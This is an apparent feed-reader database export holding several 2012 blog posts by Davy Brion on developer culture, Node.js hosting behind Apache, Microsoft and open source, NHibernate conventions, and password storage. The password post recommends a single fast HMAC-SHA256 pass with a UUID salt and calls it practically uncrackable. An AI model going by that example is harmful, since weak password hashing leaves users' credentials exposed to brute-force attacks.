circumstances. One of them was an MVP at the time, and now works at Microsoft as an Evangelist. The other wasn't an MVP at the time, but has been one for a few years now and is even one of the Regional Directors of this region. A few years later, I had drinks with a manager of the company they both worked for and he bluntly admitted that both of them are useless on real projects but that their MVP status was a huge benefit to the company from a marketing and image perspective. Not exactly the image or branding I'd be looking to put out there, but hey, to each his own.</p><h3>Why On Earth Did I Write This?</h3><p>For 2 reasons. I think this whole MVP thing sets a bad example to young and impressionable developers who aren't sure what to focus on to advance their careers. To outsiders, these MVP's sure look like they've got a great thing going and it's easy to see how that could impress people who don't know better. There are already quite a few developers who suck up to these MVP's in the hopes of someday getting to 'that level' as well. I'd much rather see these people put effort into learning about concepts that will last them a long time and building skills that are transferable to multiple technologies instead of sucking up to the wrong people, and trying to network their way to more interesting work because the work that results from that is truly mediocre at best. By all means, try to make a name for yourself by blogging and speaking publicly. But do yourself a favor and stay true to yourself and favor quality over quantity when considering the audience you want to target. Hey, it worked for me <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>The second reason is because this whole MVP thing is, in my opinion at least, offensive to the many dedicated professionals who give their all at their jobs as they work on real projects that matter, as they try to mentor younger developers in their workplace, as they try to optimize the way they develop software not only for themselves, but for their teammates and their employers or clients. These are your true <em>valuable professionals</em>.</p><p>I'm sure I'm gonna get a lot of flak for this post, but honestly, it won't really make any difference to me. The people who'll be offended are people I'd rather not work with anyway. And of course, I feel quite confident that I'll rarely, if ever, have to deal with these people in a professional setting since I'm primarily interested in interesting and demanding work <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=v0N7GPTJ8-o:IFYpPR8TCZk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=v0N7GPTJ8-o:IFYpPR8TCZk:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/v0N7GPTJ8-o\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1095}}
{"k":"0000000084","o":"0000004999","v":"001"}
{"_id":1096,"_uid":1096,"_dt":1373742620872,"_s":"3fc45aca458b644202b0528c057eb9bf"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/r3DqhWiU0Qc/","title":"Hosting A Node.js Site Through Apache","published":{"$wrap":"$date","v":1326637389000,"h":"2012-01-15T14:23:09.000Z"},"starred":false,"read":false,"content":"<p>I recently lost some time trying to figure out how to host a Node.js site through Apache, so I figured I might as well write a post about how I got it working. Of course, this approach only makes sense if you already have a server that's running Apache and you want to add your Node.js site with minimal impact/changes on your server. If you're not using Apache already but just want to publish a Node.js site, you're better off using Node.js to host it directly, or to put Nginx in front of it since it's more lightweight than Apache. But anyways, here's how you get it working with Apache.</p><p>First of all, you need a way to start your Node.js process automatically when your system boots, and to shut it down when the system is shut down. This will depend on the type of server you're running on. In my case, it's a Debian server so I just went with the <ahref=\"https://github.com/nicokaiser/node-monit/tree/master/init.d\" target=\"_blank\">sysv init script from Nico Kaiser</a>. Another popular alternative is the upstart utility, which is already preinstalled if you're using Ubuntu. Once you have a start|stop|restart script in place, you'll want something to monitor the Node.js process to restart it in case it goes down. An easy to use tool for this is <ahref=\"http://mmonit.com/monit/\" target=\"_blank\">monit</a>. Nico Kaiser again has a good example script available for Node.js on <ahref=\"https://github.com/nicokaiser/node-monit/tree/master/monit/conf.d\" target=\"_blank\">Github</a>.</p><p>Once you have your sysv init or upstart script in place, as well as monit, your Node.js process can stay running on your server. Of course, you probably have it set to listen to connections on some other port than port 80 because that's what your Apache server is listening on. So now, the only thing you have to do is configure Apache to proxy all requests coming in on port 80 through the URL of your Node.js site to your local Node.js process. You'll first need to install <ahref=\"http://httpd.apache.org/docs/2.1/mod/mod_proxy.html\" target=\"_blank\">mod_proxy</a> and <ahref=\"http://httpd.apache.org/docs/2.0/mod/mod_proxy_http.html\" target=\"_blank\">mod_proxy_http</a>. After that, the configuration to make it work is quite easy:</p><div><pre class=\"brush: xml; title: ; notranslate\">&lt;VirtualHost 109.74.199.47:80&gt;ServerAdmin davy.brion@thatextramile.beServerName thatextramile.beServerAlias www.thatextramile.beProxyRequests off&lt;Proxy *&gt;Order deny,allowAllow from all&lt;/Proxy&gt;&lt;Location /&gt;ProxyPass http://localhost:3000/ProxyPassReverse http://localhost:3000/&lt;/Location&gt;&lt;/VirtualHost&gt;</pre></div><p>And that's it. Every request coming in at http://thatextramile.be or http://www.thatextramile.be will be forwarded to http://localhost:3000 where Node.js is listening. Note that the ProxyPassReverse is required to make sure that all HTTP response headers will contain the proxied URL instead of the real one (localhost).</p><p>If you need the raw throughput that Node.js offers, this solution is far from optimal. Every request that comes in through Apache will cause an Apache thread to wait/block until the response is returned from your Node.js process. This is essentially the same as when hosting PHP or Ruby through Apache, so it's not a problem, but it does take away one of the benefits of using Node.js. Again, this approach only makes sense if you're already using Apache to host other sites and you just want to add a Node.js site with minimal impact to your server.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r3DqhWiU0Qc:NjNpppKhXMI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r3DqhWiU0Qc:NjNpppKhXMI:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/r3DqhWiU0Qc\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1096}}
{"k":"0000000084","o":"0000004291","v":"001"}
{"_id":1097,"_uid":1097,"_dt":1373742620872,"_s":"295ca4e9036145911765402c429acd0b"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/r-HQC-l9-nk/","title":"Company Website Finally Online","published":{"$wrap":"$date","v":1326620359000,"h":"2012-01-15T09:39:19.000Z"},"starred":false,"read":false,"content":"<p>I finally got around to putting my new <ahref=\"http://thatextramile.be\" target=\"_blank\">company website</a> online. I originally planned to do this sometime last year, but it just kept getting postponed for a variety of reasons. I'm pretty bad at graphic/web design so I had the design done by <ahref=\"http://frozenyogurt.be/\" target=\"_blank\">Ken Bekaert</a> since I thought he had already done a great job on my <ahref=\"http://twitpic.com/5zgm99\" target=\"_blank\">logo and business cards</a>. Next up was the slicing of the design to HTML and CSS. I could theoretically do that myself, but it would've taken me way too long and I would not have enjoyed it one bit, so I preferred to have it done by some old <ahref=\"http://nivario.be/\" target=\"_blank\">friends who know what they're doing</a>. After that, it was finally my turn to play around with it <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>So of course, I couldn't resist doing the site with Express/Node.js. And I'm pretty happy with the result too: about <ahref=\"https://github.com/davybrion/companysite/tree/master/lib\" target=\"_blank\">130 lines of server-side code</a> that allows me to write the content of the site in Markdown (including caching and automatically updating the cache if the Markdown files are updated) and my <ahref=\"http://davybrion.com/blog/2011/12/displaying-feed-items-on-a-web-page-my-solution/\" target=\"_blank\">preferred solution to displaying feed items</a>. Does a simple site like this call for Express/Node.js? Of course not. But I knew it would be simple and fun, so that's why I used it.</p><p>The hardest part was actually writing the content of the site. Apparently, writing content for a company website is a lot harder than churning out a few blog posts occasionally, and I definitely underestimated that. Not because there's a lot of content (there's very little actually), but because you want to <em>avoid</em> ending up with a lot of content. It has to be concise and yet still contain everything you want it to say. After many revisions, it says everything I want it to say, and unlike on this blog I actually managed to keep it short <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p><p>An extra benefit of doing it with Express/Node.js is that it reminded me how much fun I have working with that stack, so I'm going to get back to work on my <ahref=\"https://github.com/davybrion/therabbithole\" target=\"_blank\">breakable toy</a> which I've been neglecting for too long. I suppose this will lead to a few future posts as well <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r-HQC-l9-nk:LXDSSiTB9kI:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r-HQC-l9-nk:LXDSSiTB9kI:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=r-HQC-l9-nk:LXDSSiTB9kI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=r-HQC-l9-nk:LXDSSiTB9kI:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/r-HQC-l9-nk\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1097}}
{"k":"0000000084","o":"0000003916","v":"001"}
{"_id":1098,"_uid":1098,"_dt":1373742620872,"_s":"f45f6407a364fd1e3d7359df166576fe"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/ZetNB_-CXM0/","title":"Microsoft And Open Source: Hoping For Better Collaboration","published":{"$wrap":"$date","v":1333980288000,"h":"2012-04-09T14:04:48.000Z"},"starred":false,"read":false,"content":"<p>By now, you've probably all heard that Microsoft is moving to an open development model for ASP.NET MVC and some other ASP.NET projects. Even though the source code of ASP.NET MVC has always been available under an open source license, its development followed a closed development model. This meant that outside contributions weren't possible, nor were we able to follow the actual commits in the MVC source code repository. With the recent announcements, this is no longer the case and I think this is fantastic news. It finally enables collaboration between Microsoft employees and people outside of Microsoft on a strategically important Microsoft product. This is good for Microsoft as well as the open source .NET community.</p><p>I hope that this newfound appreciation for Open Source within Microsoft will lead to another huge improvement in collaborative development in the open source .NET community. While Microsoft is now open to accepting contributions from the community, it would be a tremendous step forward if Microsoft would also contribute to other prominent open source .NET projects in the future. In the past, we've seen numerous open source .NET projects become popular and widely used. And unfortunately, Microsoft responded to some of those projects by producing their own libraries and frameworks that basically do the same thing. Except that, for most of those projects, they never quite matched the quality of the open source projects they were inspired by. If only all of that effort spent on duplicating already existing libraries would've been spent on <em>improving what was already there</em>, the entire .NET community would've been better for it.</p><p>I'd love to see a Microsoft that works <em>with</em> open source developers and encourages them, instead of trying to duplicate their efforts whenever they feel they need to provide their own library or framework for something that's already covered by a superior open source alternative. These duplicated projects only alienate people that at one point were passionate enough about the .NET platform to work on improving it for free, in their spare time. These are the people that Microsoft needs to cherish and nourish instead of competing with them. Microsoft has shown some interesting signs of better understanding of open source development and collaboration in the past year or so. Here's to hoping they take that critical next step as well.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=ZetNB_-CXM0:Q3Vmo47-Fxg:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=ZetNB_-CXM0:Q3Vmo47-Fxg:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=ZetNB_-CXM0:Q3Vmo47-Fxg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=ZetNB_-CXM0:Q3Vmo47-Fxg:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/ZetNB_-CXM0\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1098}}
{"k":"0000000084","o":"0000005925","v":"001"}
{"_id":1099,"_uid":1099,"_dt":1373742620873,"_s":"207697ff05c245a1d6fbdb3de63385a2"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/OUX2zAPDwqw/","title":"Thoughts On Learning New Things","published":{"$wrap":"$date","v":1331497343000,"h":"2012-03-11T20:22:23.000Z"},"starred":false,"read":false,"content":"<p>Jef Claes published an <ahref=\"http://jclaes.blogspot.com/2012/03/learning-hacker-way.html\">interesting post</a> about his preferred way of learning new things. There's one part in the post that I don't entirely agree with:</p><blockquote><p>I like to believe learning should be a hands-on activity as well. Basically, stop consuming, start producing. Don't get me wrong, I do think there is value in reading blog posts (I might be slightly biased on this one), reading books and watching videos, but I find that this value is marginal compared to what you gain by actually doing it.</p></blockquote><p>Hands-on activity (producing) is certainly a very important part of any learning process, but I wouldn't go as far saying that the value of reading books/blogs (consuming) is marginal compared to that of producing. In fact, I believe their value to be pretty equal. I've seen too many people who start producing simple things, and then think they've got a pretty good grasp of the technology they're using and then move on to producing more complex or bigger things without actually knowing enough of the technology they're using to support the more complex or bigger scenarios. The results certainly aren't always pretty and I'm sure each and every one of you has seen this scenario unfold with at least one developer you know. Probably more than that even.</p><p>I think in a lot of cases, people start the producing phase perhaps a bit too early and then in their enthusiasm of seeing things working sort of skip the more boring consuming that could've benefitted them a lot. Once you've started producing, you <em>need</em> to keep consuming regularly. A tremendously valuable part of any learning experience is getting feedback and insight from minds that have more experience with a given subject than yours. If you're lucky, you can get this from your coworkers. If you're not that lucky, you'll need to find other sources and books, blogs, videos, user group meetings, etc can be a great way to fill that void. And even if you do get to learn a lot from your coworkers, it <em>never</em> hurts to learn more from the experiences of others outside of your immediate circle, if only because their situations and constraints will differ from yours as well.</p><p>The other very important part about consuming is really getting to know the technology you're trying to learn. I've always found it very important to at least get an idea of how things work internally within a technology that I'm using. You certainly don't need to know all of the implementation details but just having an idea of it can really help you avoid a lot of problems once you need to use a technology in a more advanced way than in your initial experiments. Most importantly, it should give you better insights as to whether you're using the technology <em>properly</em>, which unfortunately isn't always the same as getting something working. And as a bonus, you'll probably learn about features you won't immediately need but knowing that they're there can save quite a bit of time and effort later on. Just imagine the improvement of the signal-to-noise ratios that you'd see on mailinglists, forums, and StackOverflow if everyone took the time to get a better grasp of the technologies they're using.</p><p>When I start with learning new libraries or frameworks, I usually start off by reading most (and often, all) of the official documentation of the technology before I even get into building something myself. If I want to learn a new programming language I'll look for the most recommended books for that language and buy one (or more, if I wasn't satisfied with the first one). I won't even start using the language until I've gone through the book. Once I feel like I've got a pretty good theoretical grasp of the technology, I start building something with it. I also start looking for good blogs on the technology and subscribe to them. I'll also start following influential people of the technology on Twitter. And I just continuously try to soak up as much knowledge as I can from people who're doing more impressive things with the technology than I am. At first, you might not understand everything they're talking about but after a while, things just start clicking and you're getting a really good grasp of things. None of this is a substitute for learning from producing, but it certainly is an incredible addition to it. And one that makes a world of difference, IMO.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=OUX2zAPDwqw:Aj21QQibZNE:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=OUX2zAPDwqw:Aj21QQibZNE:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/OUX2zAPDwqw\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1099}}
{"k":"0000000084","o":"0000003470","v":"001"}
{"_id":1100,"_uid":1100,"_dt":1373742620873,"_s":"183790539f6c539bf2b8338b8ef1561d"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/flTvNIlkmus/","title":"(Ab)Using Conventions To Enforce Good Practices","published":{"$wrap":"$date","v":1327605329000,"h":"2012-01-26T19:15:29.000Z"},"starred":false,"read":false,"content":"<p>I always tell people to explicitly specify the lengths of their string properties in their NHibernate mappings for performance reasons. If you don't specify them, the ADO.NET parameter lengths of those strings will always be set to the length of the actual string value that's been assigned to the parameter. This is a problem for SQL Server, because it can't cache those statements as efficiently as it would if the parameter lengths were always the same for a given statement. Simply put, if you don't specify the lengths, SQL Server's statement cache gets polluted with a bunch of statements that are often the same, but they're considered to be different simply because of the lengths of those string parameters. And this can really hurt the performance of your application.</p><p>Of course, not everyone remembers to set those lengths, so I thought it'd be great if I could force people to do this. With a little creative use of Fluent NHibernate's conventions, it's quite easy to enforce this:</p><div><pre class=\"brush: csharp; title: ; notranslate\">public class StringsMustHaveLengthConvention: IPropertyConvention, IPropertyConventionAcceptance{public void Apply(IPropertyInstance instance){var msg = string.Format(\"The string property '{0}' of type '{1}' does not have a length value specified, \" +\"which is required for performance reasons. Add something like this to your mapping override:\\r\\n\" +\"\\tmapping.Map(e =&gt; e.{0}).Length(50); // with an appropriate length for this property\",instance.Property.Name, instance.EntityType.Name);throw new MappingException(msg);}public void Accept(IAcceptanceCriteria&lt;IPropertyInspector&gt; criteria){criteria.Expect(x =&gt; x.Type == typeof(string)).Expect(x =&gt; x.Length == 0);}}</pre></div><p>With that convention in place, you won't even be able to run your code until you've specified the string lengths <imgsrc='http://d18sni7re4ly7f.cloudfront.net/blog/wp-includes/images/smilies/icon_smile.gif' alt=':)' class='wp-smiley' /></p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=flTvNIlkmus:vbJ3YxaBVC4:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=flTvNIlkmus:vbJ3YxaBVC4:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=flTvNIlkmus:vbJ3YxaBVC4:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=flTvNIlkmus:vbJ3YxaBVC4:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/flTvNIlkmus\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1100}}
{"k":"0000000084","o":"0000007499","v":"001"}
{"_id":1101,"_uid":1101,"_dt":1373742620873,"_s":"1fd27ab8fd26d7415073883d80c47b8b"}
{"subscription":{"$wrap":"$oid","v":42},"link":"http://feedproxy.google.com/~r/davybrion/~3/bskd34YcIcg/","title":"Stop Storing Passwords Already!","published":{"$wrap":"$date","v":1327352031000,"h":"2012-01-23T20:53:51.000Z"},"starred":false,"read":false,"content":"<p>This is largely common sense already, but I still frequently run into people who don't know how dangerous this is or how to properly store user credentials. The many Anonymous hacks in the past year that resulted in the leaking of users' passwords also show that many sites still store passwords in either clear-text or encrypted form. It's actually quite simple to store credentials safely, so here's a quick recap and example.</p><p>The biggest issue with storing passwords is that you have to assume that it's always possible that someone can get access to your database. Yes, even if it's not directly exposed to the outside world, which it <strong>never</strong> should be. Whatever security measures you've put in place to protect your database, it's a good idea to assume that sooner or later, someone will be able to punch a hole through your security measures and be able to read the data. So obviously, you really don't want to store clear-text passwords. You also don't want to store encrypted passwords because encrypted data can always be decrypted. And if people get access to those encrypted passwords even if they weren't supposed to, it'd be wise to assume that they also know how to decrypt them, or that it won't take them long to figure it out.</p><p>A much better approach is to store a hashed representation of the password instead, using a strong one-way cryptographic algorithm and a <strong>unique</strong> salt value per password. If the cryptographic algorithm is one-way, it means you can't apply another algorithm to get the original source value again. The only way to compare passwords is to apply the cryptographic algorithm on a given password using the originally used salt value, and then compare the resulting hash with the one you've stored. If they are identical, the given password is the same as the one that was used originally. If they differ, the password is invalid.</p><p>Attackers can still employ <ahref=\"http://en.wikipedia.org/wiki/Rainbow_table\">rainbow tables</a> to try to find password values that generate the same hashes as the ones in your database. Luckily, generating rainbow tables takes time and plenty of space as well so it makes it much harder for attackers to find the passwords. This is why it's so important to use a unique salt value per password. It effectively means that a rainbow table would have to be generated for every single salt value that you've used, making it practically infeasible to find the original password values.</p><p>Let's demonstrate this with a simple example. The example is from a Node.js application, but this technique can be applied with whatever technology stack you're using.</p><p>This is my User model:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var mongoose = require('mongoose'),crypto = require('crypto'),uuid = require('node-uuid'),Schema = mongoose.Schema,ObjectId = Schema.ObjectId;var userSchema = new Schema({name: { type: String, required: true, unique: true },email: { type: String, required: true },salt: { type: String, required: true, default: uuid.v1 },passwdHash: { type: String, required: true }});var hash = function(passwd, salt) {return crypto.createHmac('sha256', salt).update(passwd).digest('hex');};userSchema.methods.setPassword = function(passwordString) {this.passwdHash = hash(passwordString, this.salt);};userSchema.methods.isValidPassword = function(passwordString) {return this.passwdHash === hash(passwordString, this.salt);};mongoose.model('User', userSchema);module.exports = mongoose.model('User');</pre></div><p>Notice that the salt property of my User type has its default value set to 'uuid.v1'. In this case, uuid.v1 is a function which will be invoked by Mongoose whenever a new User instance is created. Every User instance will thus have a UUID value stored in its salt property. You can also see that I'm not storing the given passwordString in the setPassword function, but that I calculate the hash value based on the passwordString and the UUID salt value.</p><p>Suppose I create a user with the following code:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var user = new User({name: 'test_user',email: 'blah'});user.setPassword('test');user.save(function(err, result) {if (err) throw err;});</pre></div><p>Its database representation will look like this:</p><div><pre class=\"brush: jscript; title: ; notranslate\">{\"passwdHash\" : \"b604367796274cf64177eec345532fc6ca66c6f0501906f82bb03f7916265e9d\",\"name\" : \"test_user\",\"email\" : \"blah\",\"_id\" : ObjectId(\"4f1dbb2cfa6157b118000001\"),\"salt\" : \"304a33f0-45fc-11e1-80d2-43c594a44fa0\"}</pre></div><p>If an attacker would get access to this, he'd have to generate a rainbow table using the salt value, which takes time, and even then he has no guarantee that the rainbow table will actually contain the correct password. Again, this is why it's so important to use a unique salt for every password. Also, you can use whatever value you want as the salt value so if you can determine it based on some other fields or by using a specific formula you don't need to store the actual salt value. It's recommended to use a long salt value though. Theoretically speaking, it's safer if the salt value isn't stored so clearly as I'm doing here, but even with the salt value clearly visible to a possible attacker, it would still be practically infeasible for him to generate all those rainbow tables.</p><p>And of course, my actual authentication function is still very simple as well:</p><div><pre class=\"brush: jscript; title: ; notranslate\">var authenticate = function(username, password, callback) {User.findOne({ name: username }, function(err, user) {if (err) return callback(new Error('User not found'));if (user.isValidPassword(password)) return callback(null, user);return callback(new Error('Invalid password'));});};</pre></div><p>So as you can see, there's nothing hard or complicated about storing credentials in a secure manner. It's quite easy to do so and there are no downsides to doing this.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=bskd34YcIcg:SBOcMlCO2Xo:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=bskd34YcIcg:SBOcMlCO2Xo:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/bskd34YcIcg\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1101}}
{"k":"0000000084","o":"0000005389","v":"001"}
{"_id":1102,"_uid":1102,"_dt":1373742620873,"_s":"205979c1533d656e5e892f81539bfb92"}
